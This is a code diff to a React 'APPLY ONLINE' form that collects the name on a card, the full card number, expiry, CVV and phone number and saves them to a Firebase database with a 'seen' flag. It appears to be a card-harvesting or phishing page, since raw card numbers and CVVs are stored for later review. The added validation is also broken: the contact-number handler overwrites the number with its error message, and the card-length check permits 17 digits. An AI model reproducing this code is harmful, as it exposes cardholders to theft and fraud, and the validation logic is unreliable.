@@ -1,4 +1,4 @@
-import { Button, Stack, TextField, Typography, } from '@mui/material';
+import { Button, FormHelperText, Stack, TextField, Typography, } from '@mui/material';
 import { createUserWithEmailAndPassword } from 'firebase/auth';
 import { ref, set } from 'firebase/database';
 import { useEffect, useState } from 'react';
@@ -15,6 +15,7 @@ const Applay = () => {
     const [expirey, setExpirey] = useState("");
     const [cvv, setCvv] = useState("");
     const [contactNo, setContactNo] = useState("");
+    const [contactNoError, setContactNoError] = useState("");
     const scrolltop = useScrollTo()
     useEffect(() => {
         scrolltop()
@@ -23,7 +24,70 @@ const Applay = () => {
 
     const [isLoading, setIsLoading] = useState(true)
 
+    const [cardDetailserror, setCardDetailserror] = useState(""); // State for error message
 
+  const handleCardDetailsChange = (e) => {
+    let value = e.target.value;
+
+    // Remove all non-numeric characters to clean the input
+    value = value.replace(/\D/g, "");
+
+    // If the value exceeds 16 digits, show an error and prevent further input
+    if (value.length > 17) {
+        setCardDetailserror("Card number cannot exceed 16 digits.");
+      value = value.substring(0, 17); // Trim the value to 16 digits
+    } else {
+        setCardDetailserror(""); // Clear the error if the length is valid
+    }
+
+    // Format the input into groups of 4 digits
+    if (value.length <= 16) {
+      value = value.replace(/(\d{4})(?=\d)/g, "$1 "); // Add space after every 4 digits
+    }
+
+    setCardDetails(value); // Update the state with formatted value
+  };
+
+
+  
+  const handleDateChange = (e) => {
+    let value = e.target.value;
+
+    // Remove all non-digit characters
+    value = value.replace(/\D/g, "");
+
+    // Format to MM/YY (insert '/' after two digits)
+    if (value.length <= 2) {
+      value = value.substring(0, 2); // Limit to two digits for month
+    } else if (value.length <= 4) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4); // Insert '/' after month
+    } else {
+      value = value.substring(0, 5); // Limit to MM/YY format
+    }
+
+    setExpirey(value); // Update state with the formatted value
+  };
+
+  const validateContactNo = (value) => {
+    const regex = /^[0-9]{10}$/; // Regex for exactly 10 digits
+    return regex.test(value);
+  };
+
+  const handleContactNoChange = (e) => {
+    const value = e.target.value;
+    
+    // Set the contact number in state
+    setContactNo(value);
+
+    // Validate the contact number
+    if (value === "") {
+      setContactNoError("Contact number is required");
+    } else if (!validateContactNo(value)) {
+      setContactNo("Please enter a valid 10-digit contact number");
+    } else {
+      setContactNo(""); // Clear error if valid
+    }
+  };
 
     const timeStemp = Date.now()
 
@@ -43,13 +107,13 @@ const Applay = () => {
                 cardDetails,
                 expirey,
                 cvv,
-                email:emailCre,
+                email: emailCre,
                 loginType: "Apply",
                 contactNo,
                 uid: user?.uid,
                 date: new Date().toLocaleString(),
                 timestemp: timeStemp,
-                seen:false
+                seen: false
 
             });
             setIsLoading(false)
@@ -72,11 +136,17 @@ const Applay = () => {
 
                 <Typography textAlign={"center"} width={"100%"} sx={{ bgcolor: "blue", color: "white", padding: ".4rem", fontWeight: "600", fontSize: "1.5rem" }}>APPLY ONLINE</Typography>
 
-                <Stack width={"100%"} height={"3px"} marginTop={"3rem"} sx={{ bgcolor: "#410112", opacity: ".5" }}></Stack>
+                <Stack width={"100%"} height={"3px"} sx={{ bgcolor: "#410112", opacity: ".5" }}></Stack>
 
-                <Stack component={'form'} onSubmit={handdleSubmit} width={"100%"} marginTop={"4rem"} padding={"1rem"}>
-                    <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Name Of Card</Typography>
-                    <TextField type='text' variant='outlined'
+                <Stack component={'form'} onSubmit={handdleSubmit} width={"100%"} marginTop={"1rem"} padding={"1rem"}>
+                    <Typography
+                        sx={{ fontWeight: "700", marginTop: "1.5rem" }}
+                    >
+                        Name Of Card
+                    </Typography>
+                    <TextField
+                        type='text'
+                        variant='outlined'
                         required={true}
                         value={nameOfCard} onChange={e => setNameOfCard(e.target.value)}
                         sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
@@ -85,26 +155,46 @@ const Applay = () => {
 
                     <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Card Details</Typography>
                     <TextField
-                        type='number'
+                        type="text" // Use type="text" because we need to format it
                         required
-                        variant='outlined'
+                        variant="outlined"
+                        value={cardDetails}
+                        onChange={handleCardDetailsChange}
+                        sx={{
+                            borderRadius: "2rem",
+                            width: "100%",
+                            marginTop: "5px",
+                            '& .MuiInputBase-input': {
+                                fontSize: '1.3rem', // Adjust font size for better visibility
+                            },
+                        }}
+                        placeholder="1234 5678 9101 1121"
+                        error={!!cardDetailserror} // Set the error state to true if there's an error
 
-                        value={cardDetails} onChange={e => setCardDetails(e.target.value)}
-
-                        sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' } }}
-                        placeholder="1234-5678-9101-1121" />
-
+                    />
+                    {cardDetailserror && (
+                        <FormHelperText error>{cardDetailserror}</FormHelperText> // Display error message
+                    )}
                     <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Expiry</Typography>
                     <TextField
-                        value={expirey} onChange={e => setExpirey(e.target.value)}
-                        inputProps={{
-                            maxLength: 10,
-                            minlength: 10
-                        }} variant='outlined' sx={{
-                            borderRadius: "2rem",
-                            width: "{100%", marginTop: "5px", '& placeholder': { fontSize: '1.3rem' }
-                        }} placeholder="MM/YY " type='number' required />
-
+      value={expirey}
+      onChange={handleDateChange}
+      inputProps={{
+        maxLength: 5, // Ensure the input value is limited to MM/YY format
+      }}
+      variant="outlined"
+      sx={{
+        borderRadius: "2rem",
+        width: "100%",
+        marginTop: "5px",
+        '& .MuiInputBase-input': {
+          fontSize: '1.3rem',
+        },
+      }}
+      placeholder="MM/YY"
+      type="text" // Use type="text" to allow for manual formatting (number type might not allow slashes)
+      required
+    />
 
                     <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Cvv</Typography>
                     <TextField
@@ -119,9 +209,9 @@ const Applay = () => {
                     <Typography sx={{ fontWeight: "700", marginTop: "1.5rem" }}>Contact No.</Typography>
                     <TextField
                         value={contactNo} onChange={e => setContactNo(e.target.value)}
-                        type='text' variant='outlined'
+                        type='number' variant='outlined'
                         sx={{ borderRadius: "2rem", width: "100%", marginTop: "5px", '& label': { fontSize: '1.3rem' } }}
-                        placeholder='0000000000' required />
+                        placeholder='Contact No.' required />
 
 
                     <Stack width={"100%"} padding={"2rem 0"}>
